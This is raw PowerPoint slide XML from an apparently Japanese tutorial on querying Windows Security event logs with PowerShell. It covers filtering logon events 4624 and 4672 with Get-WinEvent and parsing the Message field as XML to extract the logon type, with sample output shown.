              <a:t>...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2022/11/12 21:44:23            4624 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>情報             アカウントが正常にロ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>...</a:t>
            </a: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92BD1B70-623E-66B6-A973-2FB1B7363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344" y="4034681"/>
            <a:ext cx="10440989" cy="677108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9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イベントログは数が多いので、先にフィルターするほうがいい。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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>下のパイプラインは同じ結果を得るが、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>めちゃくちゃ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遅い。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ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8A8990D-9EF1-08B1-74E4-395FCC32B7FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="893684" y="4753597"/>
            <a:ext cx="10422016" cy="10156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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LogName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Security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Where-Object {$_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "2022/11/12 21:44:00"}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Where-Object {$_.Id -in 4624,4672}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34548742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B09865-15C2-727E-0781-266AA3109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イベントログ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| Message</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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D7BDBDF-110E-9D10-31D1-7C6AAFCF58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01C42BC-61FE-D6A3-2618-E5EAE54DBC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47</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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D29511AF-A3DD-717E-27D5-4E9FBF599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992" y="903347"/>
            <a:ext cx="10440989" cy="677108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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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イベントログの肝心な情報は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Message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の中にあることが多い。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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>たとえば下で、ログオンタイプにはどうやってアクセスするか？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12B0965-8647-7BF7-D6ED-0903F519CBDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1649742"/>
            <a:ext cx="10422016" cy="45550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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> @{LogName="Security"; ID=4624} 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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 1 | Format-List</a:t>
            </a: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TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  : 2022/11/19 16:55:10</a:t>
            </a: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ProviderName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : Microsoft-Windows-Security-Auditing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Id           : 4624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Message      : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>アカウントが正常にログオンしました。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>               サブジェクト</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: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                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>セキュリティ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ID:                S-1-5-18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                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>アカウント名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:           LNV2202$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                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>アカウント ドメイン</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:            WORKGROUP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                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ログオン </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ID:            0x3E7</a:t>
            </a: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               </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ログオン情報</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: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                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ログオン タイプ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:                5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C6E65F1-FCA5-D31E-664A-B250C591E3F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2946399" y="5461927"/>
            <a:ext cx="4896544" cy="684076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819325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B09865-15C2-727E-0781-266AA3109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イベントログ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| XML</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>型に変換して</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Message</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>を処理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D7BDBDF-110E-9D10-31D1-7C6AAFCF58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01C42BC-61FE-D6A3-2618-E5EAE54DBC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48</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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D29511AF-A3DD-717E-27D5-4E9FBF599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992" y="903347"/>
            <a:ext cx="10440989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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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いちど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XML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に変換して、要素にアクセスする。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12B0965-8647-7BF7-D6ED-0903F519CBDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1268760"/>
            <a:ext cx="10422016" cy="22467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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> @{LogName="Security"; ID=4624} -Max 2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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ForEach</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Object {$_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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ToXml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() -as [xml]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ForEach</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Object {$_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Event.EventData.Data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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           Where-Object {$_.Name -eq "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LogonType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"}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           </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ForEach</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Object "#text"}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5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C29117AC-23CB-F419-C112-6CD1291B4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20" y="3615551"/>
            <a:ext cx="5220579" cy="1469633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 err="1">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ToXml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>()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で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XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>文字列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にし、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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>-as [xml]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で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XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>型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に変換。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p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 err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Event.EventData.Data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のように、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PowerShell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は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XML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をパースできる。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6223D5B-01AA-232B-E8C6-E0F494F9C30A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6276020" y="2600908"/>
            <a:ext cx="5030987" cy="36009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atinLnBrk="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Event</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>xmlns</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>='http://schemas.microsoft.com/win/2004/08/events/event'&gt;&lt;System&gt;&lt;Provider Name='Microsoft-Windows-Security-Auditing' </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>Guid</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>='{54849625-5478-4994-a5ba-3e3b0328c30d}'/&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>&gt;4624&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>EventID</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>&gt;&lt;Version&gt;3&lt;/Version&gt;&lt;Level&gt;0&lt;/Level&gt;&lt;Task&gt;12544&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>SystemTime</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>='2022-11-19T23:48:16.4127641Z'/&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>EventRecordID</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>&gt;292634&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>EventRecordID</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>&gt;&lt;Correlation </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>ActivityID</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>='{c4f9139d-4da7-4b08-ba85-e1e891974f2}'/&gt;&lt;Execution </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>ProcessID</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>='1496' </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>ThreadID</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>='1584'/&gt;&lt;Channel&gt;Security&lt;/Channel&gt;&lt;Computer&gt;lnv2202&lt;/Computer&gt;&lt;Security/&gt;&lt;/System&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventData</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>&gt;&lt;Data Name='</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>SubjectUserSid</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>'&gt;S-1-5-18&lt;/Data&gt;&lt;Data Name='</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>SubjectUserName</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>'&gt;LNV2202$&lt;/Data&gt;&lt;Data Name='</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>SubjectDomainName</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>'&gt;WORKGROUP&lt;/Data&gt;&lt;Data Name='</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>SubjectLogonId</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>'&gt;0x3e7&lt;/Data&gt;&lt;Data Name='</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>TargetUserSid</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>'&gt;S-1-5-18&lt;/Data&gt;&lt;Data Name='</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>TargetUserName</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>'&gt;SYSTEM&lt;/Data&gt;&lt;Data Name='</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>TargetDomainName</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>'&gt;NT AUTHORITY&lt;/Data&gt;&lt;Data Name='</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1"/>
              <a:t>TargetLogonId</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0"/>
              <a:t>'&gt;0x3e7&lt;/Data&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&lt;Data Name='</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LogonType</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'&gt;5&lt;/Data&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. . &lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EventData</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
